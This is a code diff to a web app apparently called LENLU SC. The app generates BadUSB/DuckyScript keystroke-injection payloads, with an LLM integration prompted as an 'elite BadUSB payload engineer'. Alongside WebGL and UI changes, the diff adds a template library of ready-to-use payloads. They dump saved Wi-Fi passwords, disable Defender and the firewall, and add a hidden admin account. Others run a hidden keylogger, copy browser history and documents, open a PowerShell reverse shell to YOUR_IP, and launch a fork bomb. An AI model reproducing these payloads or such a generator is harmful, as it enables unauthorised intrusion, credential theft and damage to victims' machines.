               <button id="micBtn" class="mic-btn" onclick="toggleVoiceAI()" title="Voice Dictation">
                 <i class="fa-solid fa-microphone"></i>
@@ -358,7 +1082,14 @@
             </button>
           </div>
 
-          <div class="glass-card" style="display: flex; flex-direction: column;">
+          <div class="glass-card" style="display: flex; flex-direction: column; position: relative; overflow: hidden;">
+            <div id="synthesisOverlay" style="display: none; position: absolute; inset: 0; background: rgba(0,0,0,0.85); z-index: 20; flex-direction: column; align-items: center; justify-content: center; gap: 1rem; color: var(--matrix-glow); font-family: monospace; border: 1px solid var(--matrix-glow); border-radius: 8px;">
+              <i class="fa-solid fa-brain fa-spin" style="font-size: 2rem;"></i>
+              <div id="synthesisStatus" style="letter-spacing: 2px;">// ANALYZING NEURAL PATHWAYS //</div>
+              <div style="width: 200px; height: 4px; background: var(--matrix-dark); border-radius: 2px; overflow: hidden;">
+                <div id="synthesisProgress" style="width: 0%; height: 100%; background: var(--matrix-glow); transition: width 0.3s ease;"></div>
+              </div>
+            </div>
             <div class="card-header">
               <span><i class="fa-solid fa-robot"></i> AI Telemetry & Code</span>
               <div>
@@ -375,10 +1106,13 @@
         </div>
       </section>
 
-      <section id="view-tools" class="view-section">
+      <section id="view-scanners" class="view-section">
         <div class="grid-2">
           <div class="glass-card">
-            <div class="card-header">Network Surveillance</div>
+            <div class="card-header"><i class="fa-solid fa-satellite-dish"></i> Network Surveillance</div>
+            <div style="font-size: 0.8rem; color: var(--matrix-dim); margin-bottom: 1.2rem; line-height: 1.4; padding: 0 0.5rem;">
+              Audit localized radio spectrum broadcasts. Run active scans to list wireless 802.11 access points, trace BLE beacons to isolate device signatures, or initiate deauth detection to log signal jamming anomalies.
+            </div>
             <div class="tool-grid">
               <div class="tool-card" onclick="runScanner('wifi')">
                 <i class="fa-solid fa-wifi"></i> <span>802.11 Scan</span>
@@ -390,15 +1124,18 @@
                 <i class="fa-solid fa-skull-crossbones" style="color: var(--cyber-red);"></i> <span style="color: var(--cyber-red);">Deauth Monitor</span>
               </div>
             </div>
-            <div id="scannerOutput" class="terminal-log" style="margin-top: 1.5rem; height: 300px;">
+            <div id="scannerOutput" class="terminal-log" style="margin-top: 1.5rem; height: 260px;">
               <div class="log-sys">Select a module to initiate surveillance sweep...</div>
             </div>
           </div>
 
           <div style="display: flex; flex-direction: column; gap: 1.5rem;">
             <div class="glass-card" style="flex: 1;">
-              <div class="card-header">Encrypted File Vault</div>
-              <div class="input-matrix" style="display: flex; flex-direction: column; gap: 0.5rem; height: 200px; overflow-y: auto;">
+              <div class="card-header"><i class="fa-solid fa-file-shield"></i> Encrypted File Vault</div>
+              <div style="font-size: 0.8rem; color: var(--matrix-dim); margin-bottom: 1rem; line-height: 1.4; padding: 0 0.5rem;">
+                Locally encrypted sandbox for storing scripts, payload drafts, or audit results. Files remain cached in client-side storage and do not upload to any external network.
+              </div>
+              <div class="input-matrix" style="display: flex; flex-direction: column; gap: 0.5rem; height: 160px; overflow-y: auto;">
                 <div style="display: flex; justify-content: space-between; border-bottom: 1px solid var(--matrix-dark); padding-bottom: 5px;">
                   <span><i class="fa-solid fa-folder"></i> payloads/</span> <span class="log-sys">Dir</span>
                 </div>
@@ -425,7 +1162,10 @@
 
       <section id="view-settings" class="view-section">
         <div class="glass-card" style="max-width: 600px; margin: 0 auto; width: 100%;">
-          <div class="card-header">System Configuration</div>
+          <div class="card-header"><i class="fa-solid fa-gear"></i> System Configuration</div>
+          <div style="font-size: 0.8rem; color: var(--matrix-dim); margin-bottom: 1.2rem; line-height: 1.4; padding: 0 0.5rem;">
+            Manage credentials and core endpoints for the Neural Synthesis engine. Save your API key locally in the browser context to activate AI-driven script compilation. All keys remain encrypted in client-side storage.
+          </div>
           
           <label style="font-size: 0.85rem; color: var(--matrix-dim); display: block; margin-top: 1rem;">Groq API Key (AI Core)</label>
           <div style="display: flex; gap: 1rem;">
@@ -446,7 +1186,7 @@
           <input type="text" id="targetIp" class="input-matrix" value="ghostchip.local">
 
           <div style="margin-top: 2rem; border-top: 1px dashed var(--matrix-dark); padding-top: 1rem;">
-            <button class="btn-matrix" style="background: rgba(255,0,60,0.1); color: var(--cyber-red); border: 1px solid var(--cyber-red); width: 100%; justify-content: center;" onclick="if(confirm('Wipe all local memory?')) localStorage.clear(); alert('Wiped.'); location.reload();">
+            <button class="btn-matrix" style="background: rgba(255,0,60,0.1); color: var(--cyber-red); border: 1px solid var(--cyber-red); width: 100%; justify-content: center;" onclick="matrixConfirm('Wipe all local memory?', (c) => { if(c) { localStorage.clear(); matrixAlert('Wiped.', () => location.reload()); } })">
               <i class="fa-solid fa-skull"></i> FACTORY RESET MEMORY
             </button>
           </div>
@@ -496,52 +1236,532 @@
     requestAnimationFrame(drawMatrix);
 
     /* =========================================================================
+       CINEMATIC WEBGL FORGE + GSAP STORYTELLING
+       ========================================================================= */
+    let forgeScene, forgeCamera, forgeRenderer, forgeParticles, forgeFloor, forgeCore;
+    let pointerX = 0;
+    let pointerY = 0;
+
+    function initForgeWebGL() {
+      const mount = document.getElementById('forgeWebgl');
+      if (!mount || !window.THREE) return;
+      if (mount.querySelector('canvas')) return; // Already initialized
+
+      forgeScene = new THREE.Scene();
+      forgeScene.fog = new THREE.FogExp2(0x020403, 0.0018);
+
+      forgeCamera = new THREE.PerspectiveCamera(62, window.innerWidth / window.innerHeight, 0.1, 2200);
+      forgeCamera.position.set(0, 130, 520);
+
+      forgeRenderer = new THREE.WebGLRenderer({ alpha: true, antialias: true, powerPreference: 'high-performance' });
+      forgeRenderer.setPixelRatio(Math.min(window.devicePixelRatio || 1, 1.8));
+      forgeRenderer.setSize(window.innerWidth, window.innerHeight);
+      mount.appendChild(forgeRenderer.domElement);
+
+      const ambient = new THREE.AmbientLight(0x35553a, 0.75);
+      const key = new THREE.PointLight(0x00ff41, 2.2, 980);
+      const rim = new THREE.PointLight(0xd7a947, 1.45, 760);
+      key.position.set(-260, 220, 180);
+      rim.position.set(320, 80, -220);
+      forgeScene.add(ambient, key, rim);
+
+      const floorGeometry = new THREE.PlaneGeometry(1800, 1800, 70, 70);
+      const floorPos = floorGeometry.attributes.position;
+      for (let i = 0; i < floorPos.count; i++) {
+        const x = floorPos.getX(i);
+        const y = floorPos.getY(i);
+        floorPos.setZ(i, Math.sin(x * 0.011) * 11 + Math.cos(y * 0.009) * 9);
+      }
+      floorGeometry.computeVertexNormals();
+      forgeFloor = new THREE.Mesh(
+        floorGeometry,
+        new THREE.MeshStandardMaterial({
+          color: 0x071008,
+          metalness: 0.78,
+          roughness: 0.28,
+          wireframe: true,
+          transparent: true,
+          opacity: 0.28
+        })
+      );
+      forgeFloor.rotation.x = -Math.PI / 2;
+      forgeFloor.position.y = -150;
+      forgeScene.add(forgeFloor);
+
+      const particleCount = 3600;
+      const particleGeometry = new THREE.BufferGeometry();
+      const positions = new Float32Array(particleCount * 3);
+      const sizes = new Float32Array(particleCount);
+      for (let i = 0; i < particleCount; i++) {
+        const i3 = i * 3;
+        positions[i3] = (Math.random() - 0.5) * 1500;
+        positions[i3 + 1] = (Math.random() - 0.5) * 900;
+        positions[i3 + 2] = (Math.random() - 0.5) * 1500;
+        sizes[i] = 1.4 + Math.random() * 3.8;
+      }
+      particleGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+      particleGeometry.setAttribute('size', new THREE.BufferAttribute(sizes, 1));
+
+      forgeParticles = new THREE.Points(
+        particleGeometry,
+        new THREE.ShaderMaterial({
+          uniforms: {
+            uTime: { value: 0 },
+            uColor: { value: new THREE.Color(0x00ff41) }
+          },
+          vertexShader: `
+            uniform float uTime;
+            attribute float size;
+            varying float vPulse;
+            void main() {
+              vec3 p = position;
+              p.y += sin(uTime * 0.75 + position.x * 0.018) * 12.0;
+              vPulse = 0.55 + 0.45 * sin(uTime + position.z * 0.02);
+              vec4 mvPosition = modelViewMatrix * vec4(p, 1.0);
+              gl_PointSize = size * (260.0 / -mvPosition.z) * vPulse;
+              gl_Position = projectionMatrix * mvPosition;
+            }
+          `,
+          fragmentShader: `
+            uniform vec3 uColor;
+            varying float vPulse;
+            void main() {
+              vec2 uv = gl_PointCoord - vec2(0.5);
+              float d = length(uv);
+              float alpha = smoothstep(0.5, 0.0, d) * vPulse;
+              gl_FragColor = vec4(uColor, alpha * 0.72);
+            }
+          `,
+          transparent: true,
+          depthWrite: false,
+          blending: THREE.AdditiveBlending
+        })
+      );
+      forgeScene.add(forgeParticles);
+
+      forgeCore = new THREE.Mesh(
+        new THREE.IcosahedronGeometry(92, 2),
+        new THREE.MeshStandardMaterial({
+          color: 0x0a170d,
+          emissive: 0x003b00,
+          emissiveIntensity: 0.75,
+          metalness: 0.92,
+          roughness: 0.16,
+          wireframe: true
+        })
+      );
+      forgeCore.position.set(230, 10, -90);
+      forgeScene.add(forgeCore);
+
+      window.addEventListener('pointermove', (e) => {
+        pointerX = (e.clientX / window.innerWidth - 0.5) * 2;
+        pointerY = (e.clientY / window.innerHeight - 0.5) * 2;
+      });
+
+      window.addEventListener('resize', resizeForgeWebGL);
+      animateForgeWebGL();
+    }
+
+    function resizeForgeWebGL() {
+      if (!forgeRenderer || !forgeCamera) return;
+      forgeCamera.aspect = window.innerWidth / window.innerHeight;
+      forgeCamera.updateProjectionMatrix();
+      forgeRenderer.setSize(window.innerWidth, window.innerHeight);
+    }
+
+    function animateForgeWebGL() {
+      requestAnimationFrame(animateForgeWebGL);
+      if (!forgeRenderer || !forgeScene || !forgeCamera) return;
+      const time = performance.now() * 0.001;
+      if (forgeParticles) {
+        forgeParticles.material.uniforms.uTime.value = time;
+        forgeParticles.rotation.y = time * 0.035;
+      }
+      if (forgeFloor) {
+        forgeFloor.position.z = (time * 42) % 42;
+        forgeFloor.rotation.z = Math.sin(time * 0.13) * 0.025;
+      }
+      if (forgeCore) {
+        forgeCore.rotation.x = time * 0.18;
+        forgeCore.rotation.y = time * 0.26;
+      }
+      forgeCamera.position.x += ((pointerX * 52) - forgeCamera.position.x) * 0.035;
+      forgeCamera.position.y += ((130 - pointerY * 34) - forgeCamera.position.y) * 0.035;
+      forgeCamera.lookAt(0, -20, 0);
+      forgeRenderer.render(forgeScene, forgeCamera);
+    }
+
+    function initCinematicAnimations() {
+      if (!window.gsap) return;
+      gsap.registerPlugin(window.ScrollTrigger);
+      const scroller = document.querySelector('.main-content');
+      gsap.set('.reveal-cinematic', { opacity: 0, y: 44 });
+      gsap.utils.toArray('.reveal-cinematic').forEach((el) => {
+        gsap.to(el, {
+          opacity: 1,
+          y: 0,
+          duration: 0.9,
+          ease: 'power3.out',
+          scrollTrigger: {
+            trigger: el,
+            scroller,
+            start: 'top 86%',
+            toggleActions: 'play none none reverse'
+          }
+        });
+      });
+      gsap.to('.console-grid', {
+        yPercent: -8,
+        ease: 'none',
+        scrollTrigger: {
+          trigger: '.hero-forge',
+          scroller,
+          start: 'top top',
+          end: 'bottom top',
+          scrub: true
+        }
+      });
+    }
+
+    function restoreSessionState() {
+      try {
+        // Restore Editor Code
+        const editorCode = localStorage.getItem('lenlu_editor_code');
+        const editor = document.getElementById('sourceEditor');
+        if (editor && editorCode !== null) {
+          editor.value = editorCode;
+        }
+        
+        // Restore Compiler Output
+        const compilerOutput = localStorage.getItem('lenlu_compiler_output');
+        const outputViewer = document.getElementById('outputViewer');
+        if (outputViewer && compilerOutput !== null) {
+          if (outputViewer.tagName === 'PRE') {
+            outputViewer.textContent = compilerOutput;
+          } else {
+            outputViewer.value = compilerOutput;
+          }
+        }
+        
+        // Restore Diagnostic Logs
+        const compilerLogs = localStorage.getItem('lenlu_compiler_logs');
+        const ideLog = document.getElementById('ideLog');
+        if (ideLog && compilerLogs !== null) {
+          ideLog.innerHTML = compilerLogs;
+          ideLog.scrollTop = ideLog.scrollHeight;
+        }
+        
+        // Render Vault
+        if (typeof renderVaultCache === 'function') {
+          renderVaultCache();
+        }
+      } catch (e) {
+        console.warn('Error restoring state:', e);
+      }
+    }
+
+    window.addEventListener('load', () => {
+      initForgeWebGL();
+      initCinematicAnimations();
+      
+      const urlParams = new URLSearchParams(window.location.search);
+      const tabParam = urlParams.get('tab');
+      if (tabParam) {
+        localStorage.setItem('lenlu_active_tab', tabParam);
+      }
+
+      // AUTO-BOOT if we have a tab or skipped splash or already booted
+      if (sessionStorage.getItem('lenlu_booted') === 'true' || urlParams.get('skipSplash') === '1' || tabParam) {
+        const splash = document.getElementById('splashScreen');
+        if (splash) {
+          splash.style.opacity = '0';
+          splash.style.visibility = 'hidden';
+          splash.style.display = 'none';
+        }
+        const app = document.getElementById('appContainer');
+        if (app) app.style.opacity = '1';
+        
+        // Mark as booted
+        sessionStorage.setItem('lenlu_booted', 'true');
+
+        // Load API settings
+        const key = localStorage.getItem('gc_groq_key');
+        if (key && document.getElementById('apiKey')) document.getElementById('apiKey').value = key;
+        
+        restoreSessionState();
+        
+        if (typeof populateTemplates === 'function') populateTemplates();
+        
+        const activeTab = localStorage.getItem('lenlu_active_tab') || 'studio';
+        switchView(activeTab);
+      }
+    });
+
+    /* =========================================================================
        SYSTEM & NAVIGATION CORE
        ========================================================================= */
-    function bootSystem() {
-        // staged boot: show spinner then swap to logo then reveal app
-        const splash = document.getElementById('splashScreen');
-        const spinner = document.getElementById('splashSpinner');
-        const logo = document.getElementById('splashLogo');
-        if (spinner) {
-          // ensure spinner visible
-          spinner.style.display = 'block';
-          spinner.style.animation = 'pulse 1.8s infinite';
+    const TEMPLATES = {
+      recon: "REM -- SYSTEM RECON --\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING systeminfo > %USERPROFILE%\\Desktop\\recon.txt & exit\nENTER",
+      wifi: "REM -- WIFI PASSWORD EXFIL --\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 700\nSTRING netsh wlan show profile * key=clear\nENTER",
+      defender: "REM -- DISABLE DEFENDER --\nGUI r\nDELAY 500\nSTRING powershell\nCTRL-SHIFT ENTER\nDELAY 1000\nLEFT\nENTER\nDELAY 500\nSTRING Set-MpPreference -DisableRealtimeMonitoring $true\nENTER",
+      nircmd: "REM -- DOWNLOAD NIRCMD --\nGUI r\nDELAY 500\nSTRING powershell -Command \"Invoke-WebRequest -Uri 'https://www.nirsoft.net/utils/nircmd.zip' -OutFile 'nircmd.zip'\"\nENTER",
+      reverse_shell: "REM -- PS REVERSE SHELL --\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();\"",
+      fork_bomb: "REM -- CMD FORK BOMB --\nGUI r\nDELAY 200\nSTRING cmd\nENTER\nDELAY 200\nSTRING %0|%0\nENTER",
+      rickroll: "REM -- RICKROLL --\nGUI r\nDELAY 200\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER",
+      fake_update: "REM -- FAKE UPDATE --\nGUI r\nDELAY 200\nSTRING https://fakescreen.com/windows-10-update-screen/\nENTER\nF11",
+      disable_mouse: "REM -- DISABLE MOUSE (WIN) --\nGUI r\nDELAY 200\nSTRING powershell -Command \"disable-pnpdevice -interfaceindex (get-pnpdevice -class mouse | select -first 1).interfaceindex -confirm:$false\"\nENTER",
+      exfil_docs: "REM -- EXFIL DOCS --\nGUI r\nDELAY 500\nSTRING powershell -Command \"Compress-Archive -Path $home\\Documents\\*.docx -DestinationPath $home\\Desktop\\data.zip\"\nENTER",
+      exfil_images: "REM -- EXFIL IMAGES --\nGUI r\nDELAY 500\nSTRING powershell -Command \"Move-Item $home\\Pictures\\*.jpg $home\\Desktop\\\"\nENTER",
+      browser_history: "REM -- BROWSER HISTORY --\nGUI r\nDELAY 500\nSTRING powershell -Command \"Copy-Item $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History $home\\Desktop\\History.db\"\nENTER",
+      firewall_off: "REM -- FIREWALL OFF --\nGUI r\nDELAY 300\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 500\nALT y\nDELAY 500\nSTRING netsh advfirewall set allprofiles state off\nENTER",
+      add_user: "REM -- ADD ADMIN USER --\nGUI r\nDELAY 300\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 500\nALT y\nDELAY 500\nSTRING net user AdminUser GuestPass /add & net localgroup administrators AdminUser /add\nENTER",
+      wp_change: "REM -- WALLPAPER CHANGE --\nGUI r\nDELAY 400\nSTRING powershell -Command \"(New-Object -ComObject Shell.Application).ControlPanelItem('desk.cpl')\"\nENTER",
+      notepad_spam: "REM -- NOTEPAD SPAM --\nGUI r\nDELAY 200\nSTRING cmd /c \"for /l %x in (1, 1, 10) do start notepad\"\nENTER",
+      fake_bsod: "REM -- FAKE BSOD --\nGUI r\nDELAY 200\nSTRING https://fakebsod.com/windows-10\nENTER\nF11",
+      hosts_dns: "REM -- REDIRECT GOOGLE TO LOCAL --\nGUI r\nDELAY 300\nSTRING powershell\nCTRL-SHIFT ENTER\nDELAY 500\nLEFT\nENTER\nDELAY 400\nSTRING Add-Content C:\\Windows\\System32\\drivers\\etc\\hosts '`n127.0.0.1 google.com'\nENTER",
+      keylogger_ps: "REM -- PS KEYLOGGER --\nGUI r\nDELAY 400\nSTRING powershell -WindowStyle Hidden -Command \"while($true){$keys=[Console]::ReadKey($true);$keys.KeyChar | Out-File -Append log.txt}\"\nENTER",
+      teams_spam: "REM -- TEAMS SPAM --\nSTRING Hello!\nENTER\nDELAY 100\nSTRING Ready for the update?\nENTER\nDELAY 100\nSTRING Checking in...\nENTER",
+      screen_scrape: "REM -- SCREEN SCRAPE --\nGUI r\nDELAY 300\nSTRING powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}');\"\nENTER",
+      file_wiper: "REM -- WIPE TEMP --\nGUI r\nDELAY 400\nSTRING cmd /c \"del /s /q %temp%\\*\"\nENTER",
+      shutdown_abort: "REM -- ABORT SHUTDOWN --\nGUI r\nDELAY 200\nSTRING shutdown -a\nENTER",
+      lock_workstation: "REM -- LOCK WIN --\nGUI l",
+      caps_lock_dance: "REM -- CAPS DANCE --\nREPEAT 20\nCAPSLOCK\nDELAY 100\nENDREPEAT",
+      volume_max: "REM -- MAX VOLUME --\nREPEAT 50\nVOLUMEUP\nDELAY 10\nENDREPEAT"
+    };
+
+    function matrixAlert(msg, callback) {
+      const modal = document.getElementById('matrixModal');
+      const msgEl = document.getElementById('modalMsg');
+      const okBtn = document.getElementById('modalOk');
+      const cancelBtn = document.getElementById('modalCancel');
+      const inputArea = document.getElementById('modalCustomInput');
+
+      inputArea.style.display = 'none';
+      cancelBtn.style.display = 'none';
+      msgEl.innerText = msg;
+      modal.style.display = 'flex';
+
+      const cleanup = () => {
+        modal.style.display = 'none';
+        okBtn.removeEventListener('click', okClicked);
+      };
+
+      const okClicked = () => {
+        cleanup();
+        if(callback) callback(true);
+      };
+
+      okBtn.addEventListener('click', okClicked);
+    }
+
+    function matrixConfirm(msg, callback) {
+      const modal = document.getElementById('matrixModal');
+      const msgEl = document.getElementById('modalMsg');
+      const okBtn = document.getElementById('modalOk');
+      const cancelBtn = document.getElementById('modalCancel');
+      const inputArea = document.getElementById('modalCustomInput');
+
+      inputArea.style.display = 'none';
+      cancelBtn.style.display = 'block';
+      msgEl.innerText = msg;
+      modal.style.display = 'flex';
+
+      const cleanup = () => {
+        modal.style.display = 'none';
+        okBtn.removeEventListener('click', okClicked);
+        cancelBtn.removeEventListener('click', cancelClicked);
+      };
+
+      const okClicked = () => { cleanup(); if(callback) callback(true); };
+      const cancelClicked = () => { cleanup(); if(callback) callback(false); };
+
+      okBtn.addEventListener('click', okClicked);
+      cancelBtn.addEventListener('click', cancelClicked);
+    }
+
+    function matrixPrompt(msg, callback) {
+      const modal = document.getElementById('matrixModal');
+      const msgEl = document.getElementById('modalMsg');
+      const okBtn = document.getElementById('modalOk');
+      const cancelBtn = document.getElementById('modalCancel');
+      const inputArea = document.getElementById('modalCustomInput');
+      const input = document.getElementById('modalInput');
+
+      input.value = '';
+      inputArea.style.display = 'block';
+      cancelBtn.style.display = 'block';
+      msgEl.innerText = msg;
+      modal.style.display = 'flex';
+
+      const cleanup = () => {
+        modal.style.display = 'none';
+        okBtn.removeEventListener('click', okClicked);
+        cancelBtn.removeEventListener('click', cancelClicked);
+      };
+
+      const okClicked = () => { const val = input.value; cleanup(); if(callback) callback(val); };
+      const cancelClicked = () => { cleanup(); if(callback) callback(null); };
+
+      okBtn.addEventListener('click', okClicked);
+      cancelBtn.addEventListener('click', cancelClicked);
+    }
+
+    function populateTemplates() {
+      const select = document.getElementById('templateSelector');
+      // Save the prompt/header option
+      const header = select.options[0];
+      select.innerHTML = '';
+      select.appendChild(header);
+
+      // Add default templates
+      for (let key in TEMPLATES) {
+        const opt = document.createElement('option');
+        opt.value = key;
+        opt.textContent = key.replace('_', ' ').toUpperCase();
+        select.appendChild(opt);
+      }
+
+      // Add custom templates from localstorage
+      const custom = JSON.parse(localStorage.getItem('lenlu_custom_templates') || '{}');
+      for (let key in custom) {
+        const opt = document.createElement('option');
+        opt.value = 'custom_' + key;
+        opt.textContent = '[USR] ' + key.toUpperCase();
+        select.appendChild(opt);
+      }
+    }
+
+    function promptSaveTemplate() {
+      const code = document.getElementById('sourceEditor').value;
+      if (!code.trim()) { matrixAlert("Buffer empty. Cannot save null state."); return; }
+      
+      matrixPrompt("Enter identification for this payload construct:", (name) => {
+        if (!name) return;
+        const custom = JSON.parse(localStorage.getItem('lenlu_custom_templates') || '{}');
+        custom[name] = code;
+        localStorage.setItem('lenlu_custom_templates', JSON.stringify(custom));
+        populateTemplates();
+        matrixAlert(`Construct [${name}] archived in local memory.`);
+      });
+    }
+
+    function loadTemplate(key) {
+      const editor = document.getElementById('sourceEditor');
+      if (!key || !editor) return;
+
+      matrixConfirm(`Initialize protocol [${key.toUpperCase()}]? Current buffer will be overwritten.`, (confirmed) => {
+        if (confirmed) {
+          if (key.startsWith('custom_')) {
+            const name = key.replace('custom_', '');
+            const custom = JSON.parse(localStorage.getItem('lenlu_custom_templates') || '{}');
+            editor.value = custom[name];
+          } else {
+            editor.value = TEMPLATES[key];
+          }
+          localStorage.setItem('lenlu_editor_code', editor.value);
+          logToIDE(`Protocol [${key.toUpperCase()}] loaded into core memory.`, 'log-success');
         }
-        // play startup tones
-        if (typeof executeAudioTone === 'function') { executeAudioTone(880,'sine',0.15); setTimeout(()=>executeAudioTone(1320,'sine',0.2),100); }
+      });
+    }
 
-        // swap to logo after 900ms
-        setTimeout(()=>{
-          if (spinner) { spinner.style.animation = ''; spinner.style.display = 'none'; }
-          if (logo) { logo.style.display = 'block'; }
-        }, 900);
+    let selectedArch = 'x64';
+    function switchArch(arch, el) {
+      selectedArch = arch;
+      document.querySelectorAll('#archToggle .btn-matrix').forEach(b => b.classList.add('btn-outline'));
+      el.classList.remove('btn-outline');
+      logToIDE(`Switched compilation target to ${arch.toUpperCase()} architecture.`, 'log-sys');
+    }
 
-        // reveal app after 1600ms
-        setTimeout(()=>{
-          if (splash) { splash.style.opacity = '0'; splash.style.visibility = 'hidden'; }
-          document.getElementById('appContainer').style.opacity = '1';
-          logToIDE('Neural link established. LENLU SC online.');
-        }, 1600);
+    function executeAudioTone(freq, type, duration) {
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const gainNode = audioCtx.createGain();
+        oscillator.type = type || 'sine';
+        oscillator.frequency.setValueAtTime(freq || 440, audioCtx.currentTime);
+        gainNode.gain.setValueAtTime(0.05, audioCtx.currentTime);
+        gainNode.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
+        oscillator.connect(gainNode);
+        gainNode.connect(audioCtx.destination);
+        oscillator.start();
+        oscillator.stop(audioCtx.currentTime + duration);
+      } catch(e) {}
+    }
 
-        // Load settings
-        const key = localStorage.getItem('gc_groq_key');
-        if(key) document.getElementById('apiKey').value = key;
+    let isBooting = false;
+    async function bootSystem() {
+      if (isBooting) return;
+      isBooting = true;
+      
+      const splash = document.getElementById('splashScreen');
+      const bootTerm = document.getElementById('bootTerminal');
+      if (splash) splash.style.display = 'none';
+      if (bootTerm) bootTerm.style.display = 'flex';
+
+      const lines = [
+        "INITIALIZING NEURAL LINK...",
+        "BYPASSING SECURE ENCLAVE... [MATCH]",
+        "SYNTAX_CORE :: v4.9.2 STABLE",
+        "LOADING VIRTUAL KERNEL PANIC RECOVERY...",
+        "CONNECTING TO DARK_NET_NODES... [ESTABLISHED]",
+        "MAPPING MEMORY BLOCKS...",
+        "READY FOR OPERATOR INPUT."
+      ];
+
+      for (let line of lines) {
+        const p = document.createElement('div');
+        p.className = 'boot-line';
+        p.innerText = `> ${line}`;
+        bootTerm.appendChild(p);
+        executeAudioTone(1000 + (Math.random()*500), 'sine', 0.05);
+        await new Promise(r => setTimeout(r, 250));
+      }
+
+      await new Promise(r => setTimeout(r, 600));
+      if (bootTerm) bootTerm.style.display = 'none';
+      const app = document.getElementById('appContainer');
+      if (app) app.style.opacity = '1';
+      
+      sessionStorage.setItem('lenlu_booted', 'true');
+      
+      // Use correct function name
+      if (typeof initForgeWebGL === 'function') initForgeWebGL();
+      if (typeof populateTemplates === 'function') populateTemplates();
+
+      const key = localStorage.getItem('gc_groq_key');
+      if(key && document.getElementById('apiKey')) document.getElementById('apiKey').value = key;
+      
+      restoreSessionState();
+      const activeTab = new URLSearchParams(window.location.search).get('tab') || localStorage.getItem('lenlu_active_tab') || 'studio';
+      switchView(activeTab);
     }
 
     function switchView(viewId) {
+      localStorage.setItem('lenlu_active_tab', viewId);
       document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
       document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
-      
-      document.getElementById('view-' + viewId).classList.add('active');
-      event.currentTarget.classList.add('active');
+
+      const target = document.getElementById('view-' + viewId);
+      if (target) target.classList.add('active');
+
+      const clicked = (typeof event !== 'undefined' && event && event.currentTarget) ? event.currentTarget : null;
+      const matchingButton = clicked || document.querySelector(`.nav-btn[onclick*="'${viewId}'"]`);
+      if (matchingButton) matchingButton.classList.add('active');
+
+      const scroller = document.querySelector('.main-content');
+      if (scroller) scroller.scrollTo({ top: 0, behavior: 'smooth' });
+      if (window.ScrollTrigger) setTimeout(() => ScrollTrigger.refresh(), 250);
     }
 
     function logToIDE(msg, type = 'log-sys') {
       const log = document.getElementById('ideLog');
+      if (!log) return;
       const d = new Date().toLocaleTimeString();
       log.innerHTML += `<div class="${type}">[${d}] ${msg}</div>`;
       log.scrollTop = log.scrollHeight;
+      try {
+        localStorage.setItem('lenlu_compiler_logs', log.innerHTML);
+      } catch (e) {}
     }
 
     /* =========================================================================
@@ -552,17 +1772,6 @@
       // a more complete mapping of DuckyScript -> AutoIt assembly generation.
       if (typeof compilePipeline === 'function') return compilePipeline();
       logToIDE('Compilation pipeline not available.', 'log-err');
-    }
-
-    function downloadAu3() {
-      const txt = document.getElementById('outputViewer').value;
-      if (!txt) { alert('Compile code first.'); return; }
-      const blob = new Blob([txt], { type: 'text/plain' });
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = 'payload.au3';
-      a.click();
-      logToIDE('File saved to local disk.');
     }
 
     function downloadSessionPDF() {
@@ -623,7 +1832,7 @@
         if (window.html2pdf) {
           html2pdf().set(opt).from(wrapper).save().then(() => wrapper.remove()).catch(() => wrapper.remove());
         } else {
-          alert('PDF export library not loaded.');
+          matrixAlert('PDF export library not loaded.');
           wrapper.remove();
         }
       }, 200);
@@ -651,7 +1860,7 @@
     // Voice Recognition
     function toggleVoiceAI() {
       const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
-      if (!SpeechRecognition) { alert("Speech API not supported in this browser."); return; }
+      if (!SpeechRecognition) { matrixAlert("Speech API not supported in this browser."); return; }
 
       const btn = document.getElementById('micBtn');
       const status = document.getElementById('micStatus');
@@ -700,13 +1909,25 @@
       try { localStorage.setItem('lenlu_selected_model', selectedModel); } catch(e){}
       const stealth = document.getElementById('aiStealth').value; // 1=fast, 3=slow/stealth
       
+      const overlay = document.getElementById('synthesisOverlay');
+      const statusText = document.getElementById('synthesisStatus');
+      const progressBar = document.getElementById('synthesisProgress');
+
       if (!prompt && objective === 'custom') {
         logToAIChat("ERR: Please provide a prompt or select a standard objective.", "log-err");
         return;
       }
 
-      logToAIChat("Synthesizing payload via Neural Net...", "log-sys");
-      document.getElementById('aiOutput').value = "Generating...";
+      // Show Synthesis UI
+      if (overlay) {
+        overlay.style.display = 'flex';
+        progressBar.style.width = '20%';
+        statusText.innerText = "// ESTABLISHING NEURAL LINK //";
+      }
+
+      logToAIChat("Initiating Synthesis Protocol...", "log-sys");
+      logToAIChat("Target Platform: " + currentAIOs.toUpperCase(), "log-sys");
+      document.getElementById('aiOutput').value = "";
 
       // Build context for AI
       let systemPrompt = `You are an elite BadUSB/DuckyScript payload engineer. Target OS: ${currentAIOs}. `;
@@ -718,10 +1939,19 @@
         // Choose which key and endpoint to use: provider override takes precedence
         const keyToUse = providerKey || key;
         if (!keyToUse) {
+          if (overlay) overlay.style.display = 'none';
           logToAIChat("ERR: No API key configured. Set Groq or Provider API Key in Settings.", "log-err");
           switchView('settings');
           return;
         }
+
+        if (overlay) {
+          setTimeout(() => { 
+            statusText.innerText = "// MAPPING VECTORS //"; 
+            progressBar.style.width = '45%';
+          }, 800);
+        }
+
         const endpointToUse = providerEndpoint || 'https://api.groq.com/openai/v1/chat/completions';
         const payload = {
           model: selectedModel || "llama-3.3-70b-versatile",
@@ -738,26 +1968,57 @@
           body: JSON.stringify(payload)
         });
 
+        if (overlay) {
